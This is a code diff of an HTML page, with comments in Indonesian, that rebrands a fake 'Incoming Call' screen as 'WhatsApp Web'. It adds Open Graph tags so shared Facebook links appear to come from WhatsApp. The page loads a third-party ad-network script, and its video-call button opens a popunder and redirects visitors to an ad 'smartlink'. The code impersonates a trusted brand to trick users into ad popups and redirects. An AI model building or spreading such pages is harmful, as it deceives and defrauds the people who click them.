@@ -3,7 +3,15 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Incoming Call</title>
+
+<!-- TITLE UNTUK BROWSER -->
+<title>WhatsApp Web</title>
+
+<!-- OPEN GRAPH UNTUK FACEBOOK (TEXT ONLY) -->
+<meta property="og:title" content="WhatsApp Web">
+<meta property="og:description" content="Continue chat on WhatsApp Web">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://USERNAME.github.io/NAMAREPO/">
 
 <!-- SOCIAL BAR -->
 <script type="text/javascript" src="https://pl28287721.effectivegatecpm.com/56/fe/3c/56fe3c7d065219faf13521cc3a3ee5ed.js"></script>
@@ -139,9 +147,7 @@ function voiceCall() {
 }
 
 function videoCall() {
-  // user interaction → popunder kebuka
   window.open("about:blank","_blank");
-
   setTimeout(() => {
     document.getElementById("status").innerText = "Connecting…";
     window.location.href = smartlink;
